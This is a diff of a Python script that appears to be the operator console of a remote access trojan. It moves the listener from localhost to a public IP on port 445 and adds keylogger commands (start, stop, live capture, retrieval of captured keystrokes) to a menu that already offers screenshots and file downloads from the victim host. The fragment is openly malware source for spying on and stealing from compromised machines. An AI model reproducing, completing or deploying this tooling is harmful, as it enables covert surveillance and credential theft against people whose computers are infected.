@@ -1,8 +1,8 @@
 import socket, os
 
 class listener(object):
-    TCP_IP = '127.0.0.1'
-    PORT = 443
+    TCP_IP = '85.255.5.44'
+    PORT = 445
     BUFFER_SIZE = 4096 * 2  # Normally 1024, but we want fast response
 
     def start(self):
@@ -32,6 +32,11 @@ class listener(object):
                     print "getFile(url to file) for download file from web."
                     print "download(path to file) for download file from host."
                     print "screenshot for create screenshot."
+                    print "keylogger start for start keylogger."
+                    print "keylogger stop for stop keylogger."
+                    print "keylogger status for get keyloger status."
+                    print "keylogger get for get captured data from keylogger."
+                    print "keylogger live for live keylogging."
                 elif resp == "clear\n":
                     os.system('cls' if os.name == 'nt' else 'clear')
                     print "***************************************"
